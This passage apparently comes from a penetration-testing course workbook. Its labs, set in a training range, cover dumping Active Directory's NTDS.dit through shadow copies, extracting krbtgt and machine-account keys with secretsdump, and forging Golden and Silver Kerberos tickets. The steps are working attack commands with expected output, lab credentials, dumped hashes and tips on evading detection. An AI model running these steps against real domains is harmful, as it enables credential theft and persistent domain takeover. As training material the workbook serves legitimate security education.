Exit Metasploit.

#### Command

exit -y

# *4: Bonus*

If you have extra time, build 64-bit Meterpreter payloads and get that working with 64-bit MSBuild. You'll need an alternate template to make the 64-bit equivalent API calls. One example template can be found here .

# Conclusions

We just ran the code of our choosing using a Microsoft signed binary. There are new techniques to do this all the time. Unlike AV/

# *Lab 5.3: Domain Dominance*

# Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise.

# Background

With Domain Admin access achieved through multiple attack paths, it's time to ensure you have persistent control over Hiboxy's entire Active Directory environment. You'll use your privileges to extract the NTDS.dit database, which contains password hashes for every user and computer account in the domain.

Using shadow copies to obtain the database without disrupting domain operations, you'll demonstrate how a single Domain Admin compromise can lead to complete and persistent domain control. The extracted hashes provide you with backup authentication methods for every account, ensuring your access survives even password reset campaigns.

→

# Lab Setup

VM used:

Linux •

You should be able to ping 10.130.10.10 from the Linux VM:

#### Command

ping -c 4 10 .130.10.10

#### Expected Results

sec560@560vm:~\$ ping -c 4 10 .130.10.10 PING 10.130.10.10 (10.130.10.10) 56(84) bytes of data. 64 bytes from 10.130.10.10: icmp\_seq=1 ttl=63 time=68.8 ms 64 bytes from 10.130.10.10: icmp\_seq=2 ttl=63 time=68.7 ms 64 bytes from 10.130.10.10: icmp\_seq=3 ttl=63 time=67.8 ms 64 bytes from 10.130.10.10: icmp\_seq=4 ttl=63 time=69.3 ms

--- 10.130.10.10 ping statistics ---

4 packets transmitted, 4 received, 0% packet loss, time 3007ms rtt min/avg/max/mdev = 67.759/68.632/69.324/0.562 ms

# Lab - Step-by-Step Instructions

We will access the DC for the hiboxy.com domain.

We compromised the SVC\_SQLService2 in the Kerberoast lab, an account with domain administrative privileges.

Because the NTDS.dit file is constantly in use by Active Directory, it cannot simply be copied and pasted to another drive as access will be denied. Because of this, we are forced to create a copy of the file and extract the copy instead of the original. To avoid complications, as this is a shared environment, the creation of the copy should NOT be executed if one already exists.

# *1: Establishing a shell on DC01*

As a reminder, we compromised the SVC\_SQLService2 account and can use it to establish a shell on the domain controller.

# Command

wmiexec.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4

# Expected Results

sec560@560vm:~\$ wmiexec.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

- [\*] SMBv3.0 dialect used
- [!] Launching semi-interactive shell Careful what you execute
- [!] Press help for extra shell commands

C:\>

If we don't specify a command, we drop into a semi-interactive shell. If you need to quit the shell, type exit (don't do that now).

There are several ways of making a copy of the NTDS.DIT file. We'll use secretsdump.py from Impacket in other labs for this purpose, for example.

For this lab, we are using vssadmin to create a shadow copy of the C drive (where NTDS.dit resides).

#### *2: Looking at Shadow Copies*

Since we have our wmiexec access to the DC, let's have a look at the shadow copies to determine if there is a snapshot.

In your wmiexec.py shell, list the shadow copies:

vssadmin.exe list shadows

If you do not see any shadow copies, create one. If there any existing shadow copies, please use an existing one. At least during flicts with other students and excessive bandwidth usage.

*No existing shadow copies*

#### Command

vssadmin.exe list shadows

# Expected Results

C:\> vssadmin.exe list shadows

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool (C) Copyright 2001-2013 Microsoft Corp.

No items found that satisfy the query.

If you see the output above, there are no shadow copies and you will have to create one in Step 3.

#### *Existing shadow copy*

You may see output like this. If so, *note the ID number of the* HarddiskVolumeShadowCopyX ; your number may be different!

vssadmin list shadows

# Expected Results

C:\> vssadmin.exe list shadows

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool

(C) Copyright 2001-2013 Microsoft Corp.

Contents of shadow copy set ID: {b6f281d5-fcf1-4bf6-afd2-b0f9e7f55ca0}

Contained 1 shadow copies at creation time: 9/8/2024 8:31:44 PM

Shadow Copy ID: {d951507f-b8b4-4c81-a6a8-ca537faeddcf}

Original Volume: (C:)\\?\Volume{6d1c1d2f-0000-0000-0000-100000000000}\

Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

 Originating Machine: dc01.hiboxy.com Service Machine: dc01.hiboxy.com

Provider: 'Microsoft Software Shadow Copy provider 1.0'

Type: ClientAccessible

Attributes: Persistent, Client-accessible, No auto release, No writers,

Differential

If you see output similar to that above, another student or your instructor has already created a shadow copy.

#### *3: Create a Shadow Copy*

If there is no shadow copy, create one using this command:

# Please ONLY run if there are no shadow copies!

Please only run this if you did not see a shadow copy in the previous step.

vssadmin create shadow /for=c:

# Expected Results

C:\> vssadmin create shadow /for=c:

vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool (C) Copyright 2001-2013 Microsoft Corp.

Successfully created shadow copy for 'c:\'

Shadow Copy ID: {d951507f-b8b4-4c81-a6a8-ca537faeddcf}

Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

Note the index number of the shadow copy you created. In our example, the number is 1 , but your number may be different.

#### *4: Creating a copy of ntds.dit and the System Hive*

Now that we have the shadow copy of the C drive, we have to extract the ntds.dit file from it.

*Note: Update the number* 1 *to the index of your shadow copy.*

#### Command

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\extract\ntds.dit

## Expected Results

C:\> copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\ntds\ntds.dit c:\extract\ntds.dit 1 file(s) copied.

# Did you get a warning about the file being in use?

If you did, another student may be accessing the file simultaneously. Change your output file, for example to C:\extract\ntds-yourfirstname.dit

In order to extract hashes from the NTDS.dit file, we will need the encryption key in the system hive. Backup the registry with the command below (this can take a minute or two to complete):

#### Command

reg save hklm\system c:\extract\system /y

# Expected Results

C:\> reg save hklm\system c:\extract\system /y

The operation completed successfully.

We added the /y so that reg will overwrite an existing file if it exists. If the file exists, and we do not add the /y , the command will hang indefinitely.

You can close this session as we no longer require it.

# *5: Copy the ntds.dit file to your machine (discussion only)*

Now that the ntds.dit copy and the system hive are present on the domain controller, we could copy it over to our machines.

The best way to copy these files is by leveraging smbclient.py . That said, we will not be executing this command and will instead use a local copy of the files in the next step.

# DO NOT RUN THIS!

The files are approximately 70M, and with all students downloading at the same time, it can overwhelm the DC. We have provided a copy of these files for you in the ~/labs directory on your Linux VM.

# Command

smbclient.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4

Then, inside the smbclient shell, you *would* run:

use c\$ cd extract get ntds.dit get system exit

# Expected Results

sec560@sec560vm:~\$ smbclient.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4

Type help for list of commands

# use c\$

# cd extract

# get ntds.dit

# get system

# exit

sec560@sec560vm:~\$

#### *6: Extracting hashes*

Now that we've shown how to bring the ntds.dit file into our possession, we can extract any password hash we desire. We will actually use a local copy of the ntds.dit file that we have placed in ~/labs/ntds.dit and the system hive in ~/labs/system .

Since the actions on the ntds.dit file are executed on our local machine, the attack is now offline and thus not visible in any network logs.

Use secretsdump.py with the following options:

- -ntds ntds.dit\_filename. •
- -system system\_filename. •
- -outputfile output\_filename. •
- LOCAL: Tells secretsdump.py that the attack is local and we are not remotely accessing credentials. •

secretsdump.py -ntds ~/labs/ntds.dit -system ~/labs/system -outputfile /tmp/hashes.txt LOCAL

# Expected Results

sec560@560vm:~\$ secretsdump.py -ntds ~/labs/ntds.dit -system ~/labs/system -outputfile /tmp/ hashes.txt LOCAL

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

- [\*] Target system bootKey: 0x79d76480fd006930fff9ee719323cc89
- [\*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
- [\*] Searching for pekList, be patient
- [\*] PEK # 0 found and decrypted: 57611253471e9952a545e169c8e117ba
- [\*] Reading and decrypting hashes from /home/sec560/labs/ntds.dit

hiboxy.com\Administrator:500:aad3b435b51404eeaad3b435b51404ee:

2e920723943f81ec0af0fd735f737fef:::

Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::

SROCAdmin:1000:aad3b435b51404eeaad3b435b51404ee:2e920723943f81ec0af0fd735f737fef:::

DC01\$:1001:aad3b435b51404eeaad3b435b51404ee:2461e0adc067331aa6f617995e574221:::

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f0cc426747b3e28d5d16baed2c98d6d:::

hiboxy.com\SVC\_SQLService:1104:aad3b435b51404eeaad3b435b51404ee:

46827f7a02b1381dc3293e9c84e7dcd6:::

hiboxy.com\SVC\_SQLService2:1105:aad3b435b51404eeaad3b435b51404ee:

144bdef70fbe14727a97cb3b82e9f3d1:::

hiboxy.com\krosterman:1106:aad3b435b51404eeaad3b435b51404ee:

2fcc82e9615c6a08e7ba6c9ecb80c548:::

hiboxy.com\smorgan:1107:aad3b435b51404eeaad3b435b51404ee:

397e2528a292cec11f524928fa89325c:::

- ...trimmed for brevity...
- [\*] Cleaning up...

In the output above, you can see the result of this action.

At this point, we have a few options:

- Crack the password hashes. •
- Pass-the-hash. •
- Use the krbtgt hash for golden ticket attacks. •

# *7: Bonus*

If you have extra time, use Hashcat with the dictionaries provided and the techniques discovered in class to crack the passwords. You may try various cracking techniques:

- Straight dictionary. •
- Dictionary with masks. •
- Rules. •

# Conclusion

In this lab, we looked at how we can use a domain user with administrative privileges to obtain a copy of the NTDS.dit file using shadow copies. Using this file, we have the power to extract the password hashes for any user or computer account in the domain.

# *Lab 5.4: Golden Ticket*

# Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise.

# Background

To achieve persistence in Hiboxy's domain, you'll forge a Golden Ticket using the krbtgt account hash extracted from the domain controller. This ticket grants you the ability to impersonate any user in the domain for the next 10 years (or until the krbtgt password is changed twice).

The Golden Ticket represents the pinnacle of Active Directory compromise - with it, you can authenticate as any user, including Domain Admins, without their actual credentials. You'll demonstrate how this access survives password changes and even account deletions, highlighting why krbtgt password rotation is crucial after any domain compromise.

→

# Lab Setup

VM used:

Linux •

You should be able to ping (and resolve) dc01.hiboxy.com (10.130.10.10) from the SEC560 Linux VM:

#### Command

ping -c 4 10 .130.10.10

# Expected Results

sec560@560vm:~\$ ping -c 4 10 .130.10.10 PING 10.130.10.10 (10.130.10.10) 56(84) bytes of data. 64 bytes from 10.130.10.10: icmp\_seq=1 ttl=63 time=66.8 ms 64 bytes from 10.130.10.10: icmp\_seq=2 ttl=63 time=66.0 ms 64 bytes from 10.130.10.10: icmp\_seq=3 ttl=63 time=67.0 ms 64 bytes from 10.130.10.10: icmp\_seq=4 ttl=63 time=66.9 ms

--- 10.130.10.10 ping statistics ---

4 packets transmitted, 4 received, 0% packet loss, time 3005ms rtt min/avg/max/mdev = 65.950/66.668/66.993/0.421 ms

# Lab – Step-by-Step Instructions

We will access the DC for hiboxy.com domain. Remember that we compromised the SVC\_SQLService2 Domain Admin account in the Kerberoast lab, an account which had domain administrative privileges. From here, our goal is to obtain the hash for the krbtgt account, which we can use to create a golden ticket.

# *1: Extract secrets of the krbtgt account*

We will attempt to extract the account secrets of the krbtgt account from the domain controller, using secretsdump.py and the Domain Admin account credentials we recovered in the Kerberos lab. Secretsdump.py is part of the excellent Impacket tool suite.

The domain administrator account recovered in the Kerberos lab is:

Domain: hiboxy.com •

Username: SVC\_SQLService2 •

Password: ^Cakemaker •

As a reminder, in order to generate a valid golden ticket, we'll need to extract either the NT hash or the AES key (which is the Kerberos encryption key) for the krbtgt account. The syntax for the command is:

# Example command

secretsdump.py domain/username@targetoptions

We can also add :password (with the actual account password instead of literally password) after the username to save time if we are going to use the same (or similar) command again.

We are going to use -just-dc-user option to extract the password hash for the krbtgt account.

Use secretsdump.py to get the password hashes fo the krbtgt account:

secretsdump.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4-just-dc-user krbtgt

# Expected Results

sec560@560vm:~\$ secretsdump.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4-just-dc-user krbtgt Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

- [\*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
- [\*] Using the DRSUAPI method to get NTDS.DIT secrets

krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5f0cc426747b3e28d5d16baed2c98d6d:::

[\*] Kerberos keys grabbed

krbtgt:aes256-cts-hmac-

sha1-96:73a1ab696c7fe0764307512e3bfe23e25fcdedb15e520a95489c8be946a52554

krbtgt:aes128-cts-hmac-sha1-96:9dcebb78b8ff5b521e449edee03126c9

krbtgt:des-cbc-md5:d0d591a479627ad0

[\*] Cleaning up...

The output of the command should clearly show the Kerberos keys being extracted. In the output above, you'll note that both the NT hash (which is the RC4 encryption key) and the AES encryption keys are extracted! Excellent!

# NT Hash Change

The NT hash here has been intentionally modified. The hash is randomly generated by Windows when the lab is built so we cannot share this value ahead of time!

# *2: Retrieve domain information to create the Golden Ticket*

In the previous step, we obtained the most critical (and hardest to obtain) piece of information to create the golden ticket, password hash of the krbtgt account that is used to encrypt the TGT.

This being said, there's a bit more information on the domain we'll need to acquire to successfully create a golden ticket.

First, we need to know the fully qualified domain name of the domain. We can find this information by executing the ipconfig / all command on a target machine that is joined to the domain.

Use wmiexec.py with ipconfig /all to get the name of the domain:

wmiexec.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4 ipconfig /all

# Expected Results

sec560@560vm:~\$ wmiexec.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4 ipconfig /all Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[\*] SMBv3.0 dialect used

# Windows IP Configuration

Host Name . . . . . . . . . . . . : dc01

Primary Dns Suffix . . . . . . . : hiboxy.com

Node Type . . . . . . . . . . . . : Hybrid IP Routing Enabled. . . . . . . . : No WINS Proxy Enabled. . . . . . . . : No

DNS Suffix Search List. . . . . . : us-east-1.ec2-utilities.amazonaws.com

us-east-2.compute.internal

us-east-2.ec2-utilities.amazonaws.com

hiboxy.com

## Ethernet adapter Ethernet:

Connection-specific DNS Suffix . : hiboxy.com

Description . . . . . . . . . . . : Amazon Elastic Network Adapter #2

Physical Address. . . . . . . . . : 06-CD-17-EC-44-91

DHCP Enabled. . . . . . . . . . . : Yes Autoconfiguration Enabled . . . . : Yes

Link-local IPv6 Address . . . . . : fe80::fa69:b2e6:c644:1075%7(Preferred)

IPv4 Address. . . . . . . . . . . : 10.130.10.4(Preferred)

Subnet Mask . . . . . . . . . . . : 255.255.255.0

...truncated for brevity...

The FQDN will be in the Primary Dns Suffix section, which in our case will be hiboxy.com. Of course, we already knew that, but it never hurts to confirm.

We will also need the domain SID. In order to find this, we will use lookupsid.py , again a tool from the Impacket suite. The script uses the same targeting syntax as the previously used Impacket commands.

Run the lookupsid.py command using the same targeting information from earlier in the lab. We'll get RIDs up to, but not including, 520 using this command:

lookupsid.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4 520

# Expected Results

sec560@560vm:~\$ lookupsid.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4 520 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

- [\*] Brute forcing SIDs at 10.130.10.4
- [\*] StringBinding ncacn\_np:10.130.10.4[\pipe\lsarpc]
- [\*] Domain SID is: S-1-5-21-4148103352-2461449634-48610133

498: HIBOXY\Enterprise Read-only Domain Controllers (SidTypeGroup)

500: HIBOXY\Administrator (SidTypeUser)

501: HIBOXY\Guest (SidTypeUser)

502: HIBOXY\krbtgt (SidTypeUser)

512: HIBOXY\Domain Admins (SidTypeGroup)

513: HIBOXY\Domain Users (SidTypeGroup)

514: HIBOXY\Domain Guests (SidTypeGroup)

515: HIBOXY\Domain Computers (SidTypeGroup)

516: HIBOXY\Domain Controllers (SidTypeGroup)

517: HIBOXY\Cert Publishers (SidTypeAlias)

518: HIBOXY\Schema Admins (SidTypeGroup)

519: HIBOXY\Enterprise Admins (SidTypeGroup)

The domain SID should appear at the start of the output. It starts with S-1-5 (see highlighted text above).

# Domain SID will be different!

The SID shown above (S-1-5-21-4148103352-2461449634-48610133) will be different from what you see. Use the value on your screen! This value is randomly generated when the environment is built.

# *3: Create a Golden Ticket*

With the above information, we can now create our golden ticket. From our Linux VM, we can do this using ticketer.py , yet another tool from the Impacket suite! On a Windows machine, you could instead use tools such as Mimikatz or Rubeus.

Use the ticketer.py script with the following options:

- -domain: the target domain name is hiboxy.com. •
- -domain-sid : The target domain SID (Security Identifier). •
- -aesKey: We will create a golden ticket using the AES key (either the AES128 or AES256 key will work) we previously stole. •
- Finally, we specify we want to create a golden ticket for the Administrator account. •

# SID and Hash have changed!

The Domain SID and AES Key shown below will not match what you see on your screen. Use the value on your screen in place of the values shown here.

ticketer.py -domain hiboxy.com -domain-sid S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ -aesKey REPLACETHISfe23e25fcdedb15e520a95489c8be946a52554 Administrator 2 >/dev/null

# Expected Results

sec560@560vm:~\$ ticketer.py -domain hiboxy.com -domain-sid S-1-5-21-4148103352-2461449634-48610133 aesKey 73a1ab696c7fe0764307512e3bfe23e25fcdedb15e520a95489c8be946a52554 Administrator 2>/dev/null Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

- [\*] Creating basic skeleton ticket and PAC Infos
- [\*] Customizing ticket for hiboxy.com/Administrator
- [\*] PAC\_LOGON\_INFO
- [\*] PAC\_CLIENT\_INFO\_TYPE
- [\*] EncTicketPart
- [\*] EncAsRepPart
- [\*] Signing/Encrypting final ticket
- [\*] PAC\_SERVER\_CHECKSUM
- [\*] PAC\_PRIVSVR\_CHECKSUM
- [\*] EncTicketPart
- [\*] EncASRepPart
- [\*] Saving ticket in Administrator.ccache

# Domain SID and hashes will be different!

Both of the Domain SID and the hashes of the krbtgt account are randomly generated when the lab is built. You will need to use the values shown on your screen, not the values show in this lab!

# Curious about that 2>/dev/null ?

The current revision of Impacket uses some deprecated Python functions that generate warnings. The 2>/dev/null at the end of the command suppresses these warnings. If you're curious, you can remove this part of the command and see the warnings generated.

A small note on evasion: We've used the AES key of the krbtgt account here. In a typical environment, AES is the more common Kerberos encryption type in use and using RC4 encryption (via the NT hash) is an anomaly in and of itself that would warrant further investigation.

# *4: Using the Golden Ticket*

In a real-life scenario, the golden ticket could now be loaded in memory on a domain-joined machine to obtain domain administrator privileges again. Tread very carefully with this in a penetration testing engagement. Quite often, the generation of a golden ticket is considered to be out of scope, yet we find it to be valuable to explain the principle in our flagship penetration testing course.

In order to provide some reference documentation, the golden ticket could now be loaded in memory using tools such as Mimikatz (Windows):

# Example Command (Do not run)

kerberos::ptt C:\bin\ticket.kirbi

Or the Impacket suite (Linux):

# Command

export KRB5CCNAME= Administrator.ccache

Let's use the ticket to access the file01.hiboxy.com (10.130.10.44) system. We can use the wmiexec.py script again, but instead of specifying credentials we can use -k to use Kerberos authentication and -no-pass so we don't need to specify a password. We also need to specify the -dc-ip 10.130.10.4 to tell wmiexec the IP address of the domain controller.

Now, let's run the attack!

After exporting the Administrator.ccache ticket file, you can use any tool from the Impacket suite, such as wmiexec or psexec using the -k -no-pass arguments.

#### export KRB5CCNAME= Administrator.ccache

wmiexec.py -k -no-pass -dc-ip 10.130.10.4 file01.hiboxy.com hostname

# Expected Results

sec560@560vm:~\$ export KRB5CCNAME= Administrator.ccache sec560@560vm:~\$ wmiexec.py -k -no-pass -dc-ip 10.130.10.4 file01.hiboxy.com hostname Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[\*] SMBv3.0 dialect used file01

# Did you get an error?

The most likely issue is a copy-paste mistake for either the domain SID, or the AES key for the krbtgt user. Double-check these values (from lookupsid.py and secretsdump.py, respectively) and try again.

#### *5: Another Ticket*

We used the account Administrator . Let's see what happens if we try a forged user and ID.

Create a golden ticket with a bogus username of pwned:

# SID and Hash have changed!

The Domain SID and AES Key shown below will not match what you see on your screen. Use the value on your screen in place of the values shown here.

ticketer.py -domain hiboxy.com -domain-sid S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ -aesKey REPLACETHISfe23e25fcdedb15e520a95489c8be946a52554 pwned 2 >/dev/null

# Expected Results

sec560@560vm:~\$ ticketer.py -domain hiboxy.com -domain-sid S-1-5-21-192933032-935247328-1510830890 aesKey 18323b71ce23ebe30a7cbeaa4860240b pwned2>/dev/null

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

- [\*] Creating basic skeleton ticket and PAC Infos
- [\*] Customizing ticket for hiboxy.com/pwned
- [\*] PAC\_LOGON\_INFO
- [\*] PAC\_CLIENT\_INFO\_TYPE
- [\*] EncTicketPart
- [\*] EncAsRepPart
- [\*] Signing/Encrypting final ticket
- [\*] PAC\_SERVER\_CHECKSUM
- [\*] PAC\_PRIVSVR\_CHECKSUM
- [\*] EncTicketPart
- [\*] EncASRepPart
- [\*] Saving ticket in pwned.ccache

Use the new ticket and ask file01.hiboxy.com what your username is using *whoami*.

#### export KRB5CCNAME= pwned.ccache

wmiexec.py -k -no-pass -dc-ip 10.130.10.4 file01.hiboxy.com whoami

# Expected Results

sec560@560vm:~\$ export KRB5CCNAME= pwned.ccache

sec560@560vm:~\$ wmiexec.py -k -no-pass -dc-ip 10.130.10.4 file01.hiboxy.com whoami

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] Kerberos SessionError: KDC\_ERR\_TGT\_REVOKED(TGT has been revoked)

Fully patched Windows 2022 domain controllers will validate the username to make sure it matches the (numeric) ID. This attack didn't work here since we are on a fully updated Windows network, but it may work on your pen tests!

# Conclusion

In this lab, we looked at how we can use a domain user with administrative privileges to obtain the Kerberos keys from the krbtgt user. This information, together with the easily retrievable domain information, such as the fully quali fied domain name and domain SID, allowed us to create a golden ticket and use this ticket to access the domain with administrative privileges.

# *Lab 5.5: Silver Ticket*

# Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise.

# Background

While Golden Tickets provide broad access, sometimes you need more targeted persistence. Silver Tickets allow you to forge service tickets for specific services without touching the domain controller, making them harder to detect.

You'll create Silver Tickets for file services on critical servers, demonstrating how computer account password hashes can be weaponized for long-term access. The ability to create tickets with arbitrary usernames and permissions showcases why service authentication in Active Directory requires careful monitoring and regular password rotation.

→

# Lab Setup

VM used:

Windows 11 •

We will access the DC for hiboxy.com domain.

We compromised the SVC\_SQLService2 in the Kerberoast lab, an account with domain administrative privileges.

Please double-check your Windows VM's clock, as if it's out of sync with the domain controller's clock, the later steps involving the Silver Ticket might not work. Change the Windows VM's time to match the current time in the Pacific time zone (using https:// time.is/PT or similar) before proceeding.

# Lab – Step-by-Step Instructions

We will access the DC for hiboxy.com domain using a Silver Ticket. This is mostly a persistence mechanism, but since domain controllers use their computer accounts for synchronizing Active Directory, a Silver Ticket attack against a domain controller can be used to regain Domain Admin access, even if all user accounts (including krbtgt) have had their passwords changed.

We can perform this attack using multiple tools including Mimikatz, ticketer.py from Impacket, and Rubeus. We'll use Rubeus here and ticketer.py in the Golden Ticket lab.

#### *1: Preparation*

We are on a VPN. We could have the VPN take control of our DNS, but we often don't want to do that. If we do, then the target organization learns all about what we're querying for, which we may not want to do. Also, they may have DNS filtering or alerting. We'd likely want to avoid the extra logs, and we sure want to avoid the alerts.

We need to configure our Windows system to use the DNS server for lookups ONLY for hiboxy.com. To do this, we need to launch an elevated PowerShell terminal. Open the link in the desktop titled *Terminal*.

Now, let's configure DNS to query 10.130.10.4 for ONLY hiboxy.com.

# Command

Add-DnsClientNrptRule -Namespace"hiboxy.com" -NameServers10.130.10.4

As a reference we can use the command below on Linux, but we already preconfigured the system by adding a network ( /etc/ systemd/network/sec560-lab.network).

# Example command

Do not run!

sudo systemd-resolve -i tun0 --set-dns =10.130.10.4 --set-domain =hiboxy.com

# *2: Getting the Information to Build a Ticket*

This entire attack can be run from a non-domain joined host. In our case, our Windows system is an attacking system that is not joined to the domain.

Let's generate a Silver Ticket using Rubeus. We need a few things:

- Hash for the target service. •
- Domain SID. •

First, let's get the domain SID. We've installed Impacket in your Windows VM. We're going to use lookupsid.py to get the SID (Security Identifier) for the domain objects. A Windows SID is in the format of with S-1-5-21-XXXXXXXXXX-YYYYYYYYYYY-ZZZZZZZZZZ-RID. The SID for each item in the domain, except the RID (Relative ID) at the end, changes. We need the base portion of the SID. Let's use the tool to extract the base SID and all RIDs up to, but not including, 520.

Open a new PowerShell shell and run the command below to get the SIDs.

lookupsid.py hiboxy.com/bgreen:Password1@10.130.10.4 520

# Expected Results

PS C:\Users\sec560> lookupsid.py hiboxy.com/bgreen:Password1@10.130.10.4 520 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

- [\*] Brute forcing SIDs at 10.130.10.4
- [\*] StringBinding ncacn\_np:10.130.10.4[\pipe\lsarpc]
- [\*] Domain SID is: S-1-5-21-3338620771-1880071138-2935716604

498: HIBOXY\Enterprise Read-only Domain Controllers (SidTypeGroup)

500: HIBOXY\Administrator (SidTypeUser)

501: HIBOXY\Guest (SidTypeUser)

502: HIBOXY\krbtgt (SidTypeUser)

512: HIBOXY\Domain Admins (SidTypeGroup)

513: HIBOXY\Domain Users (SidTypeGroup)

514: HIBOXY\Domain Guests (SidTypeGroup)

515: HIBOXY\Domain Computers (SidTypeGroup)

516: HIBOXY\Domain Controllers (SidTypeGroup)

517: HIBOXY\Cert Publishers (SidTypeAlias)

518: HIBOXY\Schema Admins (SidTypeGroup)

519: HIBOXY\Enterprise Admins (SidTypeGroup)

# SID is dynamic!

The SID above is randomly generated when the lab is built. Use the SID shown on your screen, not the one shown above!

We're going to be targeting the file01 server. We need the AES256 hash for the computer account FILE01\$. We can request that using the Domain Admin credential we found in the previous lab.

As you'll recall, the password for the SVC\_SQLService2 is ^Cakemaker.

secretsdump.py hiboxy.com/SVC\_SQLService2:^Cakemaker@10.130.10.4 -just-dc-user file01\$

# Expected Results

PS C:\Users\sec560> secretsdump.py hiboxy.com/SVC\_SQLService2: ^Cakemaker@10.130.10.4 -just-dc-user file01\$

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

- [\*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
- [\*] Using the DRSUAPI method to get NTDS.DIT secrets

FILE01\$:1401:aad3b435b51404eeaad3b435b51404ee:e633db8bc2f9ecaa71066694374eb2e1:::

[\*] Kerberos keys grabbed

FILE01\$:aes256-cts-hmac-

sha1-96:48f4ee39650c3af0ac304c3961b01cf4e38f3a6f70bb48cdc407f91a979a353b

FILE01\$:aes128-cts-hmac-sha1-96:5ea8f7f582d3b34a39c7575ff2c01233

FILE01\$:des-cbc-md5:ef2a04a7344fceea

[\*] Cleaning up...

# Hash is dynamic!

The hash above is randomly generated when the lab is built. Use the hash shown on your screen, not the one shown above!

# *3: Creating the Ticket with Rubeus*

We're going to use Rubeus for this lab. Rubeus is a toolset (written in C#) for interacting with and manipulating Kerberos.

Here are the options we are going to use with Rubeus:

- silver : The Silver Ticket feature in Rubeus. •
- /service:cifs/file01.hiboxy.com : We are going to be targeting the cifs (Common Internet File System is a dialect of SMB, which is used with fileshares). •
- /aes256:AES256\_HASH\_FROM\_secretsdump.py : We are going to generate the ticket using the AES256 hash output from secretsdump.py. •
- /sid:S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ : The SID from lookupsid.py. •
- /ptt : Load the ticket into memory so we can use it. •
- /user:bgreen : The user we are going to present in the ticket. •

In the following command you need to replace REDACTED\_AES256\_HASH and S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ with different values

Replace REDACTED\_AES256\_HASH with the AES 256 hash from secretsdump.py. In our example it is 48f4ee39650c3af0ac304c3961b01cf4e38f3a6f70bb48cdc407f91a979a353b , but yours will be different.

Replace S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ with the SID from lookupsid.py. In our example it is S-1-5-21-3338620771-1880071138-2935716604, but yours will be different.

Rubeus.exe silver /service:cifs/file01.hiboxy.com /aes256:REDACTED\_AES256\_HASH /sid:S-1-5-21-XXXXXXXXXX-YYYYYYYYYY-ZZZZZZZZZZ /ptt /user:bgreen

![](SEC560_WorkBook2_page_170_Figure_0.jpeg)

The output shows the information about the ticket that we created. It also shows the ticket was successfully loaded into memory.

Let's examine the ticket in memory with klist.exe .

klist

# Expected Results

PS C:\Users\sec560> klist

Current LogonId is 0:0x4a0f2

CachedTickets: (1)

# #0> Client: bgreen @ HIBOXY.COM

Server: cifs/file01.hiboxy.com @ HIBOXY.COM

KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96 Ticket Flags 0x40a00000-> forwardable renewablepre\_authent

Start Time: 10/2/2024 18:07:37 (local) End Time: 10/3/2024 4:07:37 (local) RenewTime: 10/9/2024 18:07:37 (local)

Session Key Type: AES-256-CTS-HMAC-SHA1-96

CacheFlags: 0 KdcCalled:

Now, let's try to access the file server!

dir \\file01.hiboxy.com\c\$

# Expected Results

PS C:\Users\sec560> dir \\file01.hiboxy.com\c\$

Directory: \\file01.hiboxy.com\c\$

| Mode | LastWriteTime        | Length Name           |
|------|----------------------|-----------------------|
|      |                      | <br>                  |
| d    | 8/18/2021 11:24 PM   | EFI                   |
| d    | 9/25/2024<br>8:45 AM | FileShare             |
| d    | 5/8/2021<br>1:20 AM  | PerfLogs              |
| d    | 9/25/2024<br>8:46 AM | Profiles              |
| d-r  | 9/25/2024<br>8:36 AM | ProgramFiles          |
| d    | 7/11/2023<br>7:40 PM | ProgramFiles<br>(x86) |
| d-r  | 9/25/2024<br>8:44 AM | Users                 |
| d    | 9/26/2024<br>7:38 AM | Windows               |

